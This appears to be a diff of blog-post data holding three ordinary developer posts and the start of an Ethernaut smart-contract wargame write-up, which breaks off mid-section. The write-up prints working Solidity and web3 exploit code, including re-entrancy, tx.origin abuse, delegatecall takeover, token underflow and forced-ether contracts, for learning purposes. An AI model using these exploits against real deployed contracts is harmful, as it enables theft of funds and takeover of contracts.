blog. One year ago, in a such a day I started learning web development . Seeing how far I did come, how I did improve with each finished project with each feedback I get ,  It all gives me the motivation and the confidence to improve further either in this field or any other.\n\n",
+            "coverImage": {
+                "data": {
+                    "id": 7,
+                    "attributes": {
+                        "name": "firstPost.png",
+                        "alternativeText": "firstPost.png",
+                        "caption": "firstPost.png",
+                        "width": 1927,
+                        "height": 1236,
+                        "formats": {
+                            "large": {
+                                "ext": ".png",
+                                "url": "https://res.cloudinary.com/dsdvvwb8v/image/upload/v1642628786/large_first_Post_a20cf16db4.png",
+                                "hash": "large_first_Post_a20cf16db4",
+                                "mime": "image/png",
+                                "name": "large_firstPost.png",
+                                "path": null,
+                                "size": 41.82,
+                                "width": 1000,
+                                "height": 641,
+                                "provider_metadata": {
+                                    "public_id": "large_first_Post_a20cf16db4",
+                                    "resource_type": "image"
+                                }
+                            },
+                            "small": {
+                                "ext": ".png",
+                                "url": "https://res.cloudinary.com/dsdvvwb8v/image/upload/v1642628788/small_first_Post_a20cf16db4.png",
+                                "hash": "small_first_Post_a20cf16db4",
+                                "mime": "image/png",
+                                "name": "small_firstPost.png",
+                                "path": null,
+                                "size": 19.71,
+                                "width": 500,
+                                "height": 321,
+                                "provider_metadata": {
+                                    "public_id": "small_first_Post_a20cf16db4",
+                                    "resource_type": "image"
+                                }
+                            },
+                            "medium": {
+                                "ext": ".png",
+                                "url": "https://res.cloudinary.com/dsdvvwb8v/image/upload/v1642628787/medium_first_Post_a20cf16db4.png",
+                                "hash": "medium_first_Post_a20cf16db4",
+                                "mime": "image/png",
+                                "name": "medium_firstPost.png",
+                                "path": null,
+                                "size": 30,
+                                "width": 750,
+                                "height": 481,
+                                "provider_metadata": {
+                                    "public_id": "medium_first_Post_a20cf16db4",
+                                    "resource_type": "image"
+                                }
+                            },
+                            "thumbnail": {
+                                "ext": ".png",
+                                "url": "https://res.cloudinary.com/dsdvvwb8v/image/upload/v1642628785/thumbnail_first_Post_a20cf16db4.png",
+                                "hash": "thumbnail_first_Post_a20cf16db4",
+                                "mime": "image/png",
+                                "name": "thumbnail_firstPost.png",
+                                "path": null,
+                                "size": 9.39,
+                                "width": 243,
+                                "height": 156,
+                                "provider_metadata": {
+                                    "public_id": "thumbnail_first_Post_a20cf16db4",
+                                    "resource_type": "image"
+                                }
+                            }
+                        },
+                        "hash": "first_Post_a20cf16db4",
+                        "ext": ".png",
+                        "mime": "image/png",
+                        "size": 22.52,
+                        "url": "https://res.cloudinary.com/dsdvvwb8v/image/upload/v1642628785/first_Post_a20cf16db4.png",
+                        "previewUrl": null,
+                        "provider": "cloudinary",
+                        "provider_metadata": {
+                            "public_id": "first_Post_a20cf16db4",
+                            "resource_type": "image"
+                        },
+                        "createdAt": "2022-01-19T21:46:28.946Z",
+                        "updatedAt": "2022-01-19T21:46:28.946Z"
+                    }
+                }
+            },
+            "tags": {
+                "data": [
+                    {
+                        "id": 5,
+                        "attributes": {
+                            "title": "UI/UX",
+                            "short": "ui-ux",
+                            "createdAt": "2022-01-19T19:29:49.133Z",
+                            "updatedAt": "2022-01-19T19:29:50.498Z",
+                            "publishedAt": "2022-01-19T19:29:50.494Z"
+                        }
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "id": 6,
+        "attributes": {
+            "title": "Invelo ~ Find a room",
+            "createdAt": "2022-07-12T11:01:35.126Z",
+            "updatedAt": "2022-07-12T12:08:23.966Z",
+            "publishedAt": "2022-07-12T11:01:39.000Z",
+            "date": "2022-04-11",
+            "slug": "invelo-find-a-room",
+            "content": "# Before starting\n\nIt’s been long since I have just realized that making an app that solves an enormous problem and changing the world is not a simple task. So, I decided to start small then started jumping on every minor problem that I face in my day and try to engineer a solution. I write it down, code it or marvel about it for days till I face the next problem. How can I solve humanity problems if I can’t just solve my own !\n\nI would like to write a lengthy post about the benefits that I had since I adopted that spirit but first let me present this app, which came from a very simple problem.\n\n\n# Hey, What was the simple problem ?\n\nIn my university, despite having schedules, things can get really messy. We have a study hall that can fit around 600 students. Sounds huge, right?** We are actually 2000 students** and just weeks before the exams, finding a place to just stand there becomes really problematic. One day, I was talking with my friend and I proposed the app just as a stupid idea. But he really liked , it was a cool way to show off our skills and learn more.\n\n# Design Process\n\nThe app was intended for **“rush use”**. we don’t expect the user to just stay on the screen for more than 5 minutes to find an open classroom or, in worst cases, write a long message describing a problem. That’s why I wanted to give a calm, sleek look, a combination of modern colors and a quick escape from the quick flow of life.\n\nIt took me a lot of iterations and studying to find the perfect combinations of peaceful cyan and attracting pink, easing it down with dark blue.\n\n\n\n![Design iterations](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1657622736/Invelo_iterations_63c7d69e66.png)\n\n## Colors\n\nHere is the final set of our colors. As we see, it’s the 10,30,60 rule here. The pink is our special; the cyan is our secondary and the dark blue is our primary.\n\n\n![App colors](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1657622735/small_Invelo_colors_906fe55e0c.png)\n\n\n## Typography\n\n**Airelon** was my font here, really cool font. Changing the weights of the font is enough to give it another feel. I did really enjoy using it. One thing I didn’t like the “L” is as big as the “i” in the bold weight.\n\n\n\n![Typography](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1657622735/Invelo_typography_29478ef87a.png)\n\n\n## Design\n\nI found a challenge to design the university room’s plan. **How can I give the users a wide view so he knows where to look? Also, how can I not lose the relation with the actual location of classes IRL ?** It was hard, and it’s the part on which I spent most of the time on. I came up with a simple solution, as you can see below. But the question here is how can I improve it or is there a better one ?\n\n![Invelo Screens](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1657622742/Invelo_screens_9622a3e413.png)\n![Invelo Screens](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1657623479/second_image_35bf04eea9.png)\n\n-------------\n\n# Development\n\n\n>**By failing to prepare, you are preparing to fail**\n\n\n― _Benjamin Franklin_\n\n\n----------------------\n\n### System Design\n\nThe missing piece, or let me say the part that I was doing in a messy way, filled with intuition, common practices following and reading big known repos.\n\n  Planning ahead and planning everything was my first approach, I didn’t want it to be iterative at first becauseI had enough experience in the “coding process” that I can speculate how things will turn out and how they will be implemented. So I started designing the architecture of the app from the bare grounds, drawing UML diagrams.\n\n\n### How did that help ?\n\n- I found ways to optimize the app. The classrooms can all be fetched and cached. The user will only have to receive the schedule and then map it to the **id** of the room.\n\n- The possibilities for the times in which classes can be announced as full are not infinite. All schedules respect the same planning but with different lectures/classrooms. It’s 6 sessions a day 1h30m each ( 8:00 to 9:30 , 9:45 to 11:15 etc). So why duplicating it ? I concluded that Time can be cached too for this app.\n\n\n\n#### So it came up to this\n\n1. So we only fetch the timetable / planning on opening the app.\n\n\n2. We use Websockets to listen for changes.\n\n\n![Invelo Classes](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1657623602/invelo_uml_9e9fc53c50.png)\n\n\n\n### Development Stack :\n\n- **Flutter** : Client\n\n- **NestJS** : Backend with websockets and Postgres for the DB.\n\n\n## Conclusion\n\nI had a lot of fun working on this project. Doing what I like on such a comfortable pace. I want to thank my professor for the encouragement and support and my dear friend Omar for being the cool flutter guy and the one that listens to my crazy ideas.\n\nIf you have any advises or questions, I am all ears reach for me on my email **yassine.belkhadem@insat.ucar.tn**",
+            "coverImage": {
+                "data": {
+                    "id": 46,
+                    "attributes": {
+                        "name": "Invelo.png",
+                        "alternativeText": "Invelo.png",
+                        "caption": "Invelo.png",
+                        "width": 1920,
+                        "height": 1080,
+                        "formats": {
+                            "large": {
+                                "ext": ".png",
+                                "url": "https://res.cloudinary.com/dsdvvwb8v/image/upload/v1657623200/large_Invelo_e1f042a5ee.png",
+                                "hash": "large_Invelo_e1f042a5ee",
+                                "mime": "image/png",
+                                "name": "large_Invelo.png",
+                                "path": null,
+                                "size": 56.37,
+                                "width": 1000,
+                                "height": 563,
+                                "provider_metadata": {
+                                    "public_id": "large_Invelo_e1f042a5ee",
+                                    "resource_type": "image"
+                                }
+                            },
+                            "small": {
+                                "ext": ".png",
+                                "url": "https://res.cloudinary.com/dsdvvwb8v/image/upload/v1657623202/small_Invelo_e1f042a5ee.png",
+                                "hash": "small_Invelo_e1f042a5ee",
+                                "mime": "image/png",
+                                "name": "small_Invelo.png",
+                                "path": null,
+                                "size": 22.89,
+                                "width": 500,
+                                "height": 281,
+                                "provider_metadata": {
+                                    "public_id": "small_Invelo_e1f042a5ee",
+                                    "resource_type": "image"
+                                }
+                            },
+                            "medium": {
+                                "ext": ".png",
+                                "url": "https://res.cloudinary.com/dsdvvwb8v/image/upload/v1657623201/medium_Invelo_e1f042a5ee.png",
+                                "hash": "medium_Invelo_e1f042a5ee",
+                                "mime": "image/png",
+                                "name": "medium_Invelo.png",
+                                "path": null,
+                                "size": 38.31,
+                                "width": 750,
+                                "height": 422,
+                                "provider_metadata": {
+                                    "public_id": "medium_Invelo_e1f042a5ee",
+                                    "resource_type": "image"
+                                }
+                            },
+                            "thumbnail": {
+                                "ext": ".png",
+                                "url": "https://res.cloudinary.com/dsdvvwb8v/image/upload/v1657623199/thumbnail_Invelo_e1f042a5ee.png",
+                                "hash": "thumbnail_Invelo_e1f042a5ee",
+                                "mime": "image/png",
+                                "name": "thumbnail_Invelo.png",
+                                "path": null,
+                                "size": 10.18,
+                                "width": 245,
+                                "height": 138,
+                                "provider_metadata": {
+                                    "public_id": "thumbnail_Invelo_e1f042a5ee",
+                                    "resource_type": "image"
+                                }
+                            }
+                        },
+                        "hash": "Invelo_e1f042a5ee",
+                        "ext": ".png",
+                        "mime": "image/png",
+                        "size": 38.89,
+                        "url": "https://res.cloudinary.com/dsdvvwb8v/image/upload/v1657623198/Invelo_e1f042a5ee.png",
+                        "previewUrl": null,
+                        "provider": "cloudinary",
+                        "provider_metadata": {
+                            "public_id": "Invelo_e1f042a5ee",
+                            "resource_type": "image"
+                        },
+                        "createdAt": "2022-07-12T10:53:22.604Z",
+                        "updatedAt": "2022-07-12T10:53:22.604Z"
+                    }
+                }
+            },
+            "tags": {
+                "data": [
+                    {
+                        "id": 1,
+                        "attributes": {
+                            "title": "Web Development ",
+                            "short": "web-dev",
+                            "createdAt": "2022-01-18T17:50:00.568Z",
+                            "updatedAt": "2022-01-18T17:50:02.050Z",
+                            "publishedAt": "2022-01-18T17:50:02.047Z"
+                        }
+                    },
+                    {
+                        "id": 4,
+                        "attributes": {
+                            "title": "Backend",
+                            "short": "backend",
+                            "createdAt": "2022-01-19T19:29:14.892Z",
+                            "updatedAt": "2022-01-19T19:29:19.835Z",
+                            "publishedAt": "2022-01-19T19:29:19.832Z"
+                        }
+                    },
+                    {
+                        "id": 5,
+                        "attributes": {
+                            "title": "UI/UX",
+                            "short": "ui-ux",
+                            "createdAt": "2022-01-19T19:29:49.133Z",
+                            "updatedAt": "2022-01-19T19:29:50.498Z",
+                            "publishedAt": "2022-01-19T19:29:50.494Z"
+                        }
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "id": 5,
+        "attributes": {
+            "title": "National Cybersecurity Website ",
+            "createdAt": "2022-06-28T22:26:52.678Z",
+            "updatedAt": "2022-07-03T17:40:31.094Z",
+            "publishedAt": "2022-06-28T22:35:31.269Z",
+            "date": "2022-06-29",
+            "slug": "ncsc-website",
+            "content": "\n## Goal of the Website \n\nDesign and Develop a Website the National Cybersecurity Congress. The app should allow: \n\n- **Registration in the event** \n- **Accommodation Booking** \n- **Display of various informations about the event** ( Program , About , Contact us )\n\n## Design process\n\nI was still heavily influenced by the minimalistic movement then so I preferred a simple design with on point interactions and heavy focus on accessibility. Getting lost on this website meant an immediate disinterest from the event and that was something I could not risk. \n\n### The Palette:\n\n No big Thinking here, I used the same color palette as the Social Media posts. \n Black my primary and red my secondary with two shades to set the emphasis level. \n\n![ Design Palette ](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1656454904/large_Design_Tokens_dc2ea95697.png)\n\n\n### Typography\n\n The Main font was **Exo**, a cool sans-serif font with really soft edges kinda looks like poppins but it's lighter and has a professional vibe. The spacing between letters were a bit larger than other fonts like Roboto which made it easier to read and made me use heavier weights comfortably.\n\n **Techno Hideo**: was my display font It showed the techie vibe of the event.\n\n![Typography](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1656454904/large_Logos_b3afd0ca8f.png)\n\n## The Design: \n\n![Design Overview](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1656455568/large_design_overview_ca613858b3.png)\n\n #### Two click rule\n \n If you keep count you should find yourself navigating to where you want or getting an action done always with 2 clicks or less. This made the registration process seems smooth and the booking flow simpler than most Google Forms or Microsoft Forms.\n \n\n#### Responsiveness\n\n Due to the small time I had to develop the app, I went easy on myself and the whole responsiveness process was about changing layouts and removing unnecessary elements from the UI.\n\n\n\n### Program Section\n\nIn the program section the white transforms to gray and that to gives the User the feeling of entering a new separate section of the website. I had fun with the animations as I tried to give a fully interactive experience for the user with the event's program.\n\n\n![Program Section Design ](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1656454904/large_Program_design_7e4f2dcf6d.png)\n\n## Development\n\n- **NextJS** was what I used for the development\n- **Tailwind CSS** as styling library to fasten things up. \n- **Framer Motion** : React Animation Library, that offers a lot of features to make complex and cool animations. I didn't want to go for GreenSock as I wasn't that familiar with it at that time.\n- **No State Management Library** : I used React Contexts.\n- **Data Fetching and API Calls** : React Query, one of the best libraries that I have learned this year and have greatly improved my websites in term of both performance and DX. This library just sums up at least 4 hooks that I was using and help me control the data caching and we should not forget the optimistic UI option. Well, it really made me think do we still need Graphql ? \n\n\n\n## In Conclusion\n\nA very challenging project, I am really proud of the outcome. Despite the simple design people had a little problem with the registration process as It demanded a good password. The problem was quickly  remediated by adding more informative messages across the password field part.\n\n I want to thank Hazem Ben Said who developed the backend and endured my never ending questions. \n\n\nWebsite Link : \n[NCSC National Cybersecurity Congress](https://nationalcybersecuritycongress.vercel.app/)\n",
+            "coverImage": {
+                "data": {
+                    "id": 37,
+                    "attributes": {
+                        "name": "main-frame.jpg",
+                        "alternativeText": "main-frame.jpg",
+                        "caption": "main-frame.jpg",
+                        "width": 2048,
+                        "height": 2048,
+                        "formats": {
+                            "large": {
+                                "ext": ".jpg",
+                                "url": "https://res.cloudinary.com/dsdvvwb8v/image/upload/v1656454904/large_main_frame_3611b0aeef.jpg",
+                                "hash": "large_main_frame_3611b0aeef",
+                                "mime": "image/jpeg",
+                                "name": "large_main-frame.jpg",
+                                "path": null,
+                                "size": 47.78,
+                                "width": 1000,
+                                "height": 1000,
+                                "provider_metadata": {
+                                    "public_id": "large_main_frame_3611b0aeef",
+                                    "resource_type": "image"
+                                }
+                            },
+                            "small": {
+                                "ext": ".jpg",
+                                "url": "https://res.cloudinary.com/dsdvvwb8v/image/upload/v1656454905/small_main_frame_3611b0aeef.jpg",
+                                "hash": "small_main_frame_3611b0aeef",
+                                "mime": "image/jpeg",
+                                "name": "small_main-frame.jpg",
+                                "path": null,
+                                "size": 15.46,
+                                "width": 500,
+                                "height": 500,
+                                "provider_metadata": {
+                                    "public_id": "small_main_frame_3611b0aeef",
+                                    "resource_type": "image"
+                                }
+                            },
+                            "medium": {
+                                "ext": ".jpg",
+                                "url": "https://res.cloudinary.com/dsdvvwb8v/image/upload/v1656454904/medium_main_frame_3611b0aeef.jpg",
+                                "hash": "medium_main_frame_3611b0aeef",
+                                "mime": "image/jpeg",
+                                "name": "medium_main-frame.jpg",
+                                "path": null,
+                                "size": 29.68,
+                                "width": 750,
+                                "height": 750,
+                                "provider_metadata": {
+                                    "public_id": "medium_main_frame_3611b0aeef",
+                                    "resource_type": "image"
+                                }
+                            },
+                            "thumbnail": {
+                                "ext": ".jpg",
+                                "url": "https://res.cloudinary.com/dsdvvwb8v/image/upload/v1656454902/thumbnail_main_frame_3611b0aeef.jpg",
+                                "hash": "thumbnail_main_frame_3611b0aeef",
+                                "mime": "image/jpeg",
+                                "name": "thumbnail_main-frame.jpg",
+                                "path": null,
+                                "size": 2.49,
+                                "width": 156,
+                                "height": 156,
+                                "provider_metadata": {
+                                    "public_id": "thumbnail_main_frame_3611b0aeef",
+                                    "resource_type": "image"
+                                }
+                            }
+                        },
+                        "hash": "main_frame_3611b0aeef",
+                        "ext": ".jpg",
+                        "mime": "image/jpeg",
+                        "size": 139.73,
+                        "url": "https://res.cloudinary.com/dsdvvwb8v/image/upload/v1656454902/main_frame_3611b0aeef.jpg",
+                        "previewUrl": null,
+                        "provider": "cloudinary",
+                        "provider_metadata": {
+                            "public_id": "main_frame_3611b0aeef",
+                            "resource_type": "image"
+                        },
+                        "createdAt": "2022-06-28T22:21:45.985Z",
+                        "updatedAt": "2022-06-28T22:21:45.985Z"
+                    }
+                }
+            },
+            "tags": {
+                "data": [
+                    {
+                        "id": 1,
+                        "attributes": {
+                            "title": "Web Development ",
+                            "short": "web-dev",
+                            "createdAt": "2022-01-18T17:50:00.568Z",
+                            "updatedAt": "2022-01-18T17:50:02.050Z",
+                            "publishedAt": "2022-01-18T17:50:02.047Z"
+                        }
+                    },
+                    {
+                        "id": 2,
+                        "attributes": {
+                            "title": "Next js",
+                            "short": "next",
+                            "createdAt": "2022-01-18T17:50:22.490Z",
+                            "updatedAt": "2022-01-18T17:50:24.203Z",
+                            "publishedAt": "2022-01-18T17:50:24.200Z"
+                        }
+                    },
+                    {
+                        "id": 5,
+                        "attributes": {
+                            "title": "UI/UX",
+                            "short": "ui-ux",
+                            "createdAt": "2022-01-19T19:29:49.133Z",
+                            "updatedAt": "2022-01-19T19:29:50.498Z",
+                            "publishedAt": "2022-01-19T19:29:50.494Z"
+                        }
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "id": 7,
+        "attributes": {
+            "title": "Openzeppelin Ethernaut - Full Writeup",
+            "createdAt": "2022-07-30T00:03:41.672Z",
+            "updatedAt": "2022-07-30T00:56:38.667Z",
+            "publishedAt": "2022-07-30T00:03:54.202Z",
+            "date": "2022-07-27",
+            "slug": "ethernaut-openzeppelin",
+            "content": "# Ethernaut Full Writeup\n\n- [Ethernaut Full Writeup](#ethernaut-full-writeup)\n  - [Hello Ethernaut](#hello-ethernaut)\n  - [Fallback](#fallback)\n  - [Fallout](#fallout)\n  - [CoinFlip](#coinflip)\n  - [Telephone](#telephone)\n  - [Token](#token)\n  - [Delegation](#delegation)\n  - [Force](#force)\n  - [Vault](#vault)\n  - [King](#king)\n  - [Re-entrancy](#re-entrancy)\n  - [Elevator](#elevator)\n  - [Privacy](#privacy)\n  - [Gatekeeper One](#gatekeeper-one)\n      - [gateOne](#gateone)\n      - [gateThree](#gatethree)\n      - [gateTwo](#gatetwo)\n  - [GateKeeper Two](#gatekeeper-two)\n      - [GateOne](#gateone-1)\n      - [GateTwo](#gatetwo-1)\n    - [gateThree](#gatethree-1)\n  - [Naught Coin](#naught-coin)\n  - [Perservation](#perservation)\n  - [Recovery](#recovery)\n  - [Magic Number](#magic-number)\n  - [Alien Codex](#alien-codex)\n  - [Denial](#denial)\n  - [Shop](#shop)\n  - [Dex](#dex)\n  - [Dex 2](#dex-2)\n  - [Challenge Description](#challenge-description)\n      - [Solidity Contract for test and for the token3](#solidity-contract-for-test-and-for-the-token3)\n  - [PuzzleWallet](#puzzlewallet)\n  - [Motorbike](#motorbike)\n\n## Hello Ethernaut\n\n> This challenge is a warm-up challenge and for those who doesn't know how to interact with contracts using the js libraries.\n\n```js\nawait contract.info()\nawait contract.info1()\nawait contract.info2(\"hello\")\n\nawait contract.infoNum()\nawait contract.info42()\n\nawait contract.theMethodName()\nawait contract.method7123949()\n\n// Here we are asked to submit the password that we know to authenticate but we didn't interact with any passwords. A quick guess, password is a public field in the contract \n\nconst password = await contract.password() // We fetch the values of variables as methods\n\nawait contract.authenticate(password);\n```\n\nChallenge solved ✅\n\n## Fallback\n\n**Challenge description**\n\n> You will beat this level if\n    - you claim ownership of the contract\n    - you reduce its balance to 0\n\n--------\n**Analysis**\n\na quick run through the code of the challenge, I extracted the valuable methods and variables we will be using.\n\n![Contribute Method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138025/c323ec3e81e2a66f654995386118d6903a9758b1fa877d780d521e99db208afb_eejfmr.png)  \n\nHere we see how the contribute method works. Pretty simple we send ether and it's recorded for us.\n\n![fallback method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138018/90f03025307c6a50bdc53647caac2e2e1e9711fb1fafb173d6765a8668e4bedf_hox5ei.png)  \n\nOkay the **receive** part. As we see here we are defining a function but without the *function* keyword. That's because the receive function is a *fallback* function, let's say some kind of function that should be existing in all smart contracts but here we are overriding its behaviour.\nActually, since the version 0.6.0 we got two functions to handle fallback cases. *fallback* and *receive*. a little explainer of how they are called ...\n\n```js\n// Explainer from: https://solidity-by-example.org/fallback/\n    // Ether is sent to contract\n    //      is msg.data empty?\n    //          /   \\ \n    //         yes  no\n    //         /     \\\n    //    receive()?  fallback() \n    //     /   \\ \n    //   yes   no\n    //  /        \\\n    //receive()  fallback()\n```\n\nSo what we need to do here actually ?\n\n1. Contribute so we have a contribution **value non nul**.\n2. Trigger the fallback function by sending ether to the contract.\n\n-----\n**Exploitation**\n\n```js\nawait contract.contribute({value:toWei(etherValue)});\nawait contract.sendTransaction({value:toWei(etherValue)});\n```\n\nChallenge solved ✅\n\n## Fallout\n\nConstructors in solidity are quite a story and they were the source of a big -----\n**Exploitation**.\nHere the challenge is quite simple. All we have is to notice the typo in the constructor function name which makes it a normal **public** function that we can call to get the contract ownership.\n\n```js\nawait contract.Fal1out();\n```\n\n## CoinFlip\n\n`Randomness is just a myth.`\n\n**Challenge description**\n\nYou'll need to use your psychic abilities to guess the correct outcome 10 times in a row.\n\n--------\n**Analysis** \n\nIn blockchain randomness is just quite the issue, not only in the blockchain really that implies for all computers systems and is due to the way we are trying to make deterministic systems have an deterministic results. The matter for the blockchain is its transparency making even finding a seed a quite impossible.\n\nHere we see the function of coinFlip\n![CoinFlip method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138024/a4a71eed827fde83d6d4140e52f376aa5b2cbea20f1587a156118f7e65fa480b_czfni3.png)  \n\nour seed is actually `block.number` but we can know this value easily from the blockchain. So all we have is create a contract that feeds the flip function the values she expect 😈\n\n-----\n**Exploitation** \n\n![CoinFlip Attack](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138010/1c39007c6e59a8ac5b4a23a23c83efc645c1ed4665dcc7686fe83f28d39bb34a_saizwt.png)  \n\nNow all we have to do is call the contract method 10 times.\n\n## Telephone\n\n**Challenge description**\n\n- Claim ownership of the contract.\n\n--------\n**Analysis**\n\n![Telephone method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138025/d794be949c9e5c756d0940618ff646c8dd477ab3f134d3973baac079ec09be4f_xqkdnr.png)  \n\nHere we see the condition being checked is as simple as `tx.origin != msg.sender` but what does `tx.origin` means ?\nActually `tx` is a global variable in the smart contract ( same as js global variables ) and it means the transaction that have been initiated on the function call.\nWhen we call a method from web3 actually we are interacting directly with the smart contract so it will initiate the transaction but when we call a contract from another contract the `tx.origin == caller.address` \n\n-----\n**Exploitation**\n\nBased on our analysis we understand all we need is to call the function from an evil contract and pass our address as parameter.\n\n```js\ninterface TelephoneInterface{ \n    function changeOwner(address _owner) external; \n}\n\ncontract EvilContract { \n    \n    TelephoneInterface victimContract;\n    contructor(address victimAddress) public {\n        victimContract = TelephoneInterface(victimAddress);\n    }\n\n    function becomeOwner(address newOwner){\n        victimContract.changeOwner(newOwner);\n    }\n}\n```\n\nChallenge solved ✅\n\n## Token\n\n--------\n**Analysis**\n\nThis challenge is about **unsigned integers**. We need to be extra duper careful when handling them as they *overlap*. What does that mean ? \n\n```c#\nuint8 X= 255;\nX=X+1 // X = 0 ;\n```\nNow you see it.\n\n![Token method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138020/61490e01f7f4c0dcaaa9366ce4607e17714ff36452e562e06c8bcd0d048c335a_df2hde.png)  \n\n```js\n require(balances[msg.sender] - _value >= 0); // How about we pass a big value to this poor unsigned balances[msg.sender] ?\n```\n\n-----\n**Exploitation**\n\nWe got 20 tokens, So I will be generous and give more than I own.\n\n```js\n await contract.transfer(player,21);\n```\n\nChallenge solved ✅\n\n## Delegation\n\n**Challenge description**\n\nThe goal of this level is for you to claim ownership of the instance you are given.\n\n--------\n**Analysis** \n\nHere we are exposed to the `delegateCall` function. If you don't know what this function does I will try to sum it up. It's a low level way to call a method of a contract ( in our case `pwn` ) in the context of another, it means it gets the storage values and global ones of the contract who called `delegateCall`.\n\n![Delegation pwn](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138021/2549219ff5c11b36a370c12f1dfd8326925489a9207074b29dfd7f83621353bc_m6k8pd.png)  \n\n![Delegation fallback](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138019/7358cfd1b967281caa40f09ba74e6e9be2e11dce5bb005022749902ece0d530a_vpu7ji.png)  \n\nOkay so what is *msg.data* ?\nmsg.data can be the function selector with the parameters in a bytes encoded format\n\n-----\n**Exploitation**\n\nI wrote a contract to get the bytes, we can also use `web3.eth.abi.encodeFunctionCall` from the console.\n\n```js\ncontract Utility {\n     function pwnEncoded () public pure returns (bytes memory) {\n      return abi.encodeWithSignature(\"pwn()\"); \n    }\n```\n\n```js\nawait contract.sendTransaction({data:valueFromContract});\n```\nChallenge solved ✅\n\n## Force\n\nWe will learn another capability of smart contracts which sometimes became problematic if we rely on it.\n\n**Challenge description**\n\nThe goal of this level is to make the balance of the contract greater than zero.\n\n--------\n**Analysis**\n\nNothing to see there the contract is pretty empty. But a big security consideration that no contract can prevent incoming ethers from the blockchain. All we can do is not rely the contract balance in our contract logic.\n\n[Link for more informations](https://docs.soliditylang.org/en/develop/security-considerations.html)\n\nSo what is the method to send ethers to an empty contract or let's say a contract that has logic which tries to prevent incoming ethers. A quick googling and I came to the answer it's the method `selfdestruct(address)`\n\n> The only way to remove code from the blockchain is when a contract at that address performs the selfdestruct operation. The remaining Ether stored at that address is sent to a designated target and then the storage and code is removed from the state\n\n[Docs Link](https://docs.soliditylang.org/en/develop/introduction-to-smart-contracts.html?highlight=selfdestruct#deactivate-and-self-destruct)\n\nWe got everything we need now let's hack !\n\n-----\n**Exploitation**\n\n```js\ncontract EvilContract { \n    // payable public so we can send it some ether to pass.\n    function forceSendBySacrifice(address victimAddress) payable public {\n        selfdestruct(_address);\n\n    }\n}\n```\n\n## Vault\n\n`transparency has no limits`\n\n**Challenge description**\n\nUnlock the vault to pass the level!\n\n--------\n**Analysis**\n\n![Vault storage](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138026/e9446fa1dc73bdd6238eccf71218b163311ff773cb9ef02980f39ab6443d8e0a_auuwqt.png)  \n![Vault method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138020/109330cb4bbe2a93530a4c5a6bda285a392f0d2878464d1a581cc5b240a4a3ee_somrgz.png)  \n\nThe private keyword of solidity is quite tricky. Private variables limit their scopes to the contract so they can't be viewed or accessed by other **contracts** logic. However anyone can view the variable values. This challenge is simple and all we have to understand is the storage is a key value store where the keys are from 0 to 2^256.\n\nHere we can see got two storage variables `locked` and `password`. I highly encouraging reading the docs [Storage solidity Docs](https://docs.soliditylang.org/en/develop/internals/layout_in_storage.html?highlight=storage) to understand how these variables are layed out.\n\nbytes32 will take a whole slot so it can share the slot with locked. We will have then :\n\n*slot0*  `locked`\n*solt1*  `password`\n\n-----\n**Exploitation**\n\n```js\n const password = await web3.eth.getStorageAt(address, 1);\n await contract.unlock()\n```\n\nChallenge solved ✅\n\n## King\n\n**Challenge description**\n\nWhen you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.\n\n--------\n**Analysis**\n\n![King method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138016/26bbecde7b1eacd1313c83ad3cd9b8dc4aa55e3dacc9e5acf006ef155bcbc49c_x8mhfi.png)  \n\nPretty interesting, at first sight you might find this function unbreakable ( as I did ). But then a good look to the transfer method. I was thinking in term of a user who will interact with this contract. How about another contract ?\nIf we go back to the `fallback` challenge we talked about *fallback* methods. Here when we call `transfer` a callback function of the contract to whom we are transferring funds to will be triggered.\n\n-----\n**Exploitation**\n\n1. Make our contract the king.\n2. Our contract now revert the transaction and won't step down from the throne 😈.\n\n```js\ncontract EvilContract { \n\n    function becomeKing(address victimAddress) public payable { \n        victimAddress.call{value:1000000000000000000}(\"\");\n    }\n\n    function() external payable { // fallback function definition\n        revert(\"The kingdom is mine now !\");\n    }\n}\n```\n\nChallenge solved ✅\n\n## Re-entrancy\n\n**Challenge description**\n\nThe goal of this level is for you to steal all the funds from the contract.\n\n--------\n**Analysis**\n\nA quick read about Re-entrancy attack is all we need: [HackerNoon Article](https://hackernoon.com/hack-solidity-reentrancy-attack).\n\n![Reentrancy method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138011/6b9b88336f13d99f52296f5874086643de346fe2aa6dbd66098162a244b11b6c_ztdmmm.png)  \n\nSo he is actually our balance after the call that's all we need !\n\n-----\n**Exploitation** \n\n```js\ninterface Reentrance {\n\n    function donate(address _to) external payable;\n    function withdraw(uint amount) public;\n}\n\ncontract EvilContract {\n    Reentrance victimContract;\n    address victimAddress;\n    uint donatedValue;\n\n    constructor(address _victimAddress) public payable {\n        // Set our victim contract, fund the contract.\n        victimContract = Reentrance(_victimAddress);\n        victimAddress= _victimAddress\n    }\n\n    function attack(uint _donatedValue) public {\n        victimContract.donate.value(address(this),{value:_donatedValue});\n        victimContract.withdraw(_donatedValue);\n        donatedValue=_donatedValue\n    }\n\n    function() public payable {\n        // Receiver for funds withdrawn by the attack\n            if(victimAddress.balance>= donatedValue )\n            victimContract.withdraw(msg.value);\n        }\n}\n```\n\nNow we should just do some arithmetic to clear all the funds and not having to donate again and withdraw. If we have 1 ether as initial balance keep 